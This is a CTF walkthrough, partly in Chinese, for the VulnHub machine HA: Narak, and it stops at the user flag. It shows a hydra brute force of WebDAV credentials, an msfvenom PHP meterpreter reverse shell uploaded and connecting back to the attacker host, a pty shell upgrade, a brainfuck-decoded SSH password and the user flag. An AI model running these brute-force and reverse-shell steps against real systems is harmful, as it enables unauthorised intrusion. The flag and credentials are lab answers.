<center>Narak</center>





[toc]









## Narak

> [vulnhub](https://www.vulnhub.com/entry/ha-narak,569/)



> Description

```shell
Narak is the Hindu equivalent of Hell. You are in the pit with the Lord of Hell himself. Can you use your hacking skills to get out of the Narak? Burning walls and demons are around every corner even your trusty tools will betray you on this quest. Trust no one. Just remember the ultimate mantra to escape Narak “Enumeration”. After getting the root you will indeed agree “Hell ain’t a bad place to be”.

Objective: Find 2 flags (user.txt and root.txt)
```







### 1. 信息收集

```shell
# 主机发现
nmap -sP 172.16.168.128/24

# 端口扫描
nmap -sV -sC 172.16.168.141

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:bd:59:2d:22:1e:b3:6b:4f:06:bf:83:e1:cc:92:43 (RSA)
|   256 f8:ec:45:84:7f:29:33:b2:8d:fc:7d:07:28:93:31:b0 (ECDSA)
|_  256 d0:94:36:96:04:80:33:10:40:68:32:21:cb:ae:68:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: NARAK
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:DF:9A:29 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

>  获取主机ip和端口

```shell
# 目录扫描
dirb http://172.16.168.141/

# webdav
http://172.16.168.141/webdav
```

[webdav](https://zh.wikipedia.org/wiki/WebDAV)

```shell
# cewl 爬去网站信息，创建字典
cewl http://172.16.168.141/ -w pass.txt

# hydra
hydra -L pass.txt -P pass.txt 172.16.168.141 http-get /webdav

[80][http-get] host: 172.16.168.141   login: yamdoot   password: Swarg
```

```shell
# 连接webdava
sudo apt install cadaver -y

cadaver http://172.16.168.141/webdav
# 用户名/密码
yamdoot/Swarg

# 上传木马
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.168.128 LPORT=4444 -f raw > shell.php

put shell.php

# msf开启
msfconsole

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set LHOST 172.16.168.128

set LPORT 4444

# 运行
run

# 访问木马 输入用户名和密码
172.16.168.141/webdav/shell.php

# 进入shell 交互终端
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

```

> bf编码 ：[ook](https://www.splitbrain.org/services/ook)

```shell
cat /mnt/hell.sh
#!/bin/bash

echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.

```

> 解码： `chitragupt`

```shell
ssh inferno@172.16.168.141 

cat user.txt
Flag: {5f95bf06ce19af69bfa5e53f797ce6e2}

```

